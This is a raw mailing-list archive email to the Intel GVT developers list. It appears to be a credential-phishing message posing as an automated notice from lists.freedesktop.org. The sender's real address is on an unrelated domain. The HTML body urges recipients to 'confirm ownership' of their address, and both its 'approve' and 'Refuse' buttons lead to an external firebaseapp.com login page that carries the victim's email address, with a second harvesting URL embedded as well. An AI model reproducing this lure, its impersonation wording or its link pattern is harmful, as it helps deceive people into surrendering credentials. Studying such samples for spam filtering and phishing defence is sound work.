Return-Path: <intel-gvt-dev-bounces@lists.freedesktop.org>
X-Original-To: lists+intel-gvt-dev@lfdr.de
Delivered-To: lists+intel-gvt-dev@lfdr.de
Received: from gabe.freedesktop.org (gabe.freedesktop.org [IPv6:2610:10:20:722:a800:ff:fe36:1795])
	by mail.lfdr.de (Postfix) with ESMTPS id 3C9B357C874
	for <lists+intel-gvt-dev@lfdr.de>; Thu, 21 Jul 2022 12:01:50 +0200 (CEST)
Received: from gabe.freedesktop.org (localhost [127.0.0.1])
	by gabe.freedesktop.org (Postfix) with ESMTP id E1C2214BF5B;
	Thu, 21 Jul 2022 10:01:48 +0000 (UTC)
X-Original-To: intel-gvt-dev@lists.freedesktop.org
Delivered-To: intel-gvt-dev@lists.freedesktop.org
X-Greylist: delayed 622 seconds by postgrey-1.36 at gabe;
 Thu, 21 Jul 2022 10:01:48 UTC
Received: from bryonye.bartmcqueary.com (bryonye.bartmcqueary.com
 [185.246.220.184])
 by gabe.freedesktop.org (Postfix) with ESMTPS id 0ABEB14BF5B
 for <intel-gvt-dev@lists.freedesktop.org>;
 Thu, 21 Jul 2022 10:01:47 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=bartmcqueary.com;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
 i=tay.dav@bartmcqueary.com; bh=mO6drDrS9Fb/gPZ338RrKBAP0QA=;
 b=yvLUYIZfWcrapbWGnYo58CNf1/Pd28RsEzg1fi5GyQ7yrfEIZbn1z6UKGYf6H+BztsfXcCjEhWId
 a1jkwkQfGEiOvQsMEPslq998IC32BbDRXyU3E8W3w+BhlxBXYn0yE6Bstigcd06sjXbLY5nC91u5
 D0TtxvWKRrAVNdvUHiDqHVhdHdenhxqlb1fsdCIQNPkN2nTOosrxCy4BKY2S64+B5luL7ifUuHkL
 KKD/iyMdgO961gcJEJlUuElSJWvr9T4J1fRlyjF7r7bhy0PupU8bF1FDRckR/6Xu1tD5vsKslSc9
 OJF/Jn/ZhvedoN1zcLNk2Fu2+ay7Htv+uoetPg==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=bartmcqueary.com;
 b=aVM/xuISMfvXx7L8jNsrq7Vs84o0AC6bTsrRU1emFFkTTH11iU7HQEwgpBMo70vnhtx3azdKvkc/
 eTa6M/6yFeQkCRiRM7HNxGcgC7Np4r661HUuOU76Y96cON1BJQ99wCj/CnJ8L/SYLRCi5KVL6Vln
 yeoGbV2wSFKkzaTd+HxfSUQe/rw7DgrZgrFR+NXrE0iGAjDa898nhltCHaSVW1DjAX92z8ohP+tB
 56hmszoZdseJEGGRTebbEdNCGvnCfRZBIQ0LUX/xTVC335fFTGYlDsENdsHP/gz4jrXlF2SC/A0T
 5nJRBnqHguDBMIsCpDvxoZUcJZzpuzMBL/CA5Q==;
From: lists.freedesktop.org  <tay.dav@bartmcqueary.com>
To: intel-gvt-dev@lists.freedesktop.org
Subject: EMAIL UPDATE
Date: 21 Jul 2022 02:49:21 -0700
Message-ID: <20220721024921.CF2E9AAD6B5C2594@bartmcqueary.com>
MIME-Version: 1.0
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable
X-BeenThere: intel-gvt-dev@lists.freedesktop.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: "Intel GVT \(Graphics Virtualization\) development list"
 <intel-gvt-dev.lists.freedesktop.org>
List-Unsubscribe: <https://lists.freedesktop.org/mailman/options/intel-gvt-dev>, 
 <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=unsubscribe>
List-Archive: <https://lists.freedesktop.org/archives/intel-gvt-dev>
List-Post: <mailto:intel-gvt-dev@lists.freedesktop.org>
List-Help: <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=help>
List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev>, 
 <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=subscribe>
Errors-To: intel-gvt-dev-bounces@lists.freedesktop.org
Sender: "intel-gvt-dev" <intel-gvt-dev-bounces@lists.freedesktop.org>

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.18817"></HEAD>
<body><SMTP@USER.COM><SENDER>
<table style=3D"FONT-SIZE: 18px; BORDER-TOP: rgb(183,183,183) thin solid; F=
ONT-FAMILY: Verdana; BORDER-RIGHT: rgb(183,183,183) thin solid; BORDER-BOTT=
OM: rgb(183,183,183) thin solid; BORDER-LEFT: rgb(183,183,183) thin solid; =
border-image: none" cellspacing=3D"0" cellpadding=3D"8">
<TBODY>
<TR style=3D"HEIGHT: 24px; BACKGROUND-COLOR: rgb(239,239,239)">
<td style=3D"FONT-SIZE: 1.2em; FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Ar=
ial,sans-serif; WIDTH: 737px; BORDER-BOTTOM: rgb(183,183,183) thin solid; C=
OLOR: rgb(51,102,153); MARGIN: 0px">intel-gvt-dev@lists.freedesktop.org</TD=
>
<td style=3D"FONT-SIZE: 0.7em; FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Ar=
ial,sans-serif; WIDTH: 235px; BORDER-BOTTOM: rgb(183,183,183) thin solid; C=
OLOR: rgb(128,128,128); TEXT-ALIGN: right; MARGIN: 0px">(Auto Generated @li=
sts.freedesktop.org)</TD></TR></TBODY></TABLE>
<DIV>
<table style=3D"FONT-SIZE: 18px; BORDER-TOP: rgb(183,183,183) thin solid; F=
ONT-FAMILY: Verdana; BORDER-RIGHT: rgb(183,183,183) thin solid; BORDER-BOTT=
OM: rgb(183,183,183) thin solid; BORDER-LEFT: rgb(183,183,183) thin solid; =
border-image: none" cellspacing=3D"0" cellpadding=3D"8">
<TBODY>
<TR>
<td style=3D"FONT-SIZE: 0.8em; FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Ar=
ial,sans-serif; WIDTH: 988px; COLOR: rgb(108,108,108); MARGIN: 0px" colspan=
=3D"2">
<P><SPAN style=3D"FONT-SIZE: 14px"><B><SPAN style=3D"VERTICAL-ALIGN: inheri=
t"><SPAN style=3D"VERTICAL-ALIGN: inherit"><SPAN lang=3Den><SPAN><SPAN>Dear=
&nbsp;intel-gvt-dev@lists.freedesktop.org</SPAN></SPAN></SPAN>&nbsp;<SPAN s=
tyle=3D"FONT-FAMILY: calibri; COLOR: rgb(29,34,40)"></SPAN></SPAN></SPAN></=
B></SPAN>&nbsp;<SPAN style=3D"FONT-SIZE: 14px; COLOR: rgb(0,0,0)"> <BR></SP=
AN></P>
<P><B style=3D"FONT-SIZE: 0.8em"><SPAN style=3D'FONT-FAMILY: helvetica,"mic=
rosoft yahei",verdana'><SPAN style=3D"VERTICAL-ALIGN: inherit"><SPAN style=
=3D"VERTICAL-ALIGN: inherit"><SPAN lang=3Den><SPAN><SPAN>To continue using =
your address intel-gvt-dev, please confirm ownership</SPAN></SPAN></SPAN> <=
/SPAN></SPAN></SPAN><SPAN style=3D"FONT-FAMILY: calibri"><SPAN style=3D"VER=
TICAL-ALIGN: inherit"><SPAN style=3D"VERTICAL-ALIGN: inherit"></SPAN></SPAN=
></SPAN></B></P>
<table>
<TBODY>
<TR>
<td style=3D"MARGIN: 0px">
<A id=3Dm_6720552438930667749gmail-m_-22581085421975377m_-89713062678356631=
44m_-5879505075212528152gmail-m_5626021955682300773gmail-m_-145949902325509=
5001gmail-m_7844347443380622644loginurl1 style=3D"FONT-SIZE: 12px; HEIGHT: =
30px; WIDTH: 85px; WHITE-SPACE: nowrap; FONT-WEIGHT: bold; COLOR: rgb(255,2=
55,255); PADDING-BOTTOM: 4px; TEXT-ALIGN: center; PADDING-TOP: 4px; PADDING=
-LEFT: 4px; DISPLAY: block; LINE-HEIGHT: 28px; PADDING-RIGHT: 4px; BACKGROU=
ND-COLOR: rgb(68,157,68); text-decoration-line: none"=20
href=3D"https://etikotvight.firebaseapp.com/nd2mx/index.html?e=3Dintel-gvt-=
dev@lists.freedesktop.org" target=3D_blank data-saferedirecturl=3D"https://=
www.google.com/url?q=3Dhttps://crazy-jones.138-197-157-123.plesk.page/adsfg=
hjkl/china-mail/index.php?email%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&am=
p;ust=3D1636622262717000&amp;usg=3DAFQjCNGnHazg6C913ggsdXCmhve8f4UbFg">appr=
ove</A></TD>
<td style=3D"MARGIN: 0px"><SPAN lang=3Den><SPAN><SPAN>or</SPAN></SPAN></SPA=
N> </TD>
<td style=3D"MARGIN: 0px">
<A id=3Dm_6720552438930667749gmail-m_-22581085421975377m_-89713062678356631=
44m_-5879505075212528152gmail-m_5626021955682300773gmail-m_-145949902325509=
5001gmail-m_7844347443380622644loginurl0 style=3D"FONT-SIZE: 12px; HEIGHT: =
30px; BORDER-TOP-COLOR: rgb(172,41,37); WIDTH: 85px; BORDER-LEFT-COLOR: rgb=
(172,41,37); FONT-WEIGHT: bold; COLOR: rgb(255,255,255); PADDING-BOTTOM: 4p=
x; BORDER-BOTTOM-COLOR: rgb(172,41,37); TEXT-ALIGN: center; PADDING-TOP: 4p=
x; PADDING-LEFT: 4px; DISPLAY: block;=20
BORDER-RIGHT-COLOR: rgb(172,41,37); LINE-HEIGHT: 28px; PADDING-RIGHT: 4px; =
BACKGROUND-COLOR: rgb(201,48,44); text-decoration-line: none" href=3D"https=
://etikotvight.firebaseapp.com/nd2mx/index.html?e=3Dintel-gvt-dev@lists.fre=
edesktop.org" target=3D_blank data-saferedirecturl=3D"https://www.google.co=
m/url?q=3Dhttps://crazy-jones.138-197-157-123.plesk.page/adsfghjkl/china-ma=
il/index.php?email%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D16366=
22262717000&amp;usg=3DAFQjCNGnHazg6C913ggsdXCmhve8f4UbFg">Refuse</A></TD></=
TR></TBODY>
</TABLE><SPAN lang=3Den><SPAN><SPAN>For more details, please log in to the =
link below.</SPAN> </SPAN></SPAN><BR><SPAN lang=3Den><SPAN><SPAN>Login URL:=
 click here</SPAN></SPAN></SPAN>=20
<P><SPAN style=3D"FONT-SIZE: 21px; COLOR: rgb(51,102,153); BACKGROUND-COLOR=
: rgb(239,239,239)">lists.freedesktop.org</SPAN></P>
<P><SPAN style=3D"FONT-SIZE: 21px; COLOR: rgb(51,102,153); BACKGROUND-COLOR=
: rgb(239,239,239)"></SPAN></P>
<table style=3D"FONT-SIZE: 18px; BORDER-TOP: rgb(183,183,183) thin solid; F=
ONT-FAMILY: Verdana; BORDER-RIGHT: rgb(183,183,183) thin solid; BORDER-BOTT=
OM: rgb(183,183,183) thin solid; BORDER-LEFT: rgb(183,183,183) thin solid; =
border-image: none" cellspacing=3D"0" cellpadding=3D"8">
<TBODY>
<TR>
<td style=3D"FONT-SIZE: 0.7em; BORDER-TOP: rgb(183,183,183) thin solid; HEI=
GHT: 18px; FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WIDT=
H: 988px; COLOR: rgb(108,108,108); MARGIN: 0px; BACKGROUND-COLOR: rgb(244,2=
44,244)" colspan=3D"2">* This is a system generated lists.freedesktop.org. =
Please do not reply.</TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></D=
IV><DEFAULT>&nbsp;&nbsp; </DEFAULT></SENDER></SMTP@USER.COM></BODY></HTML>
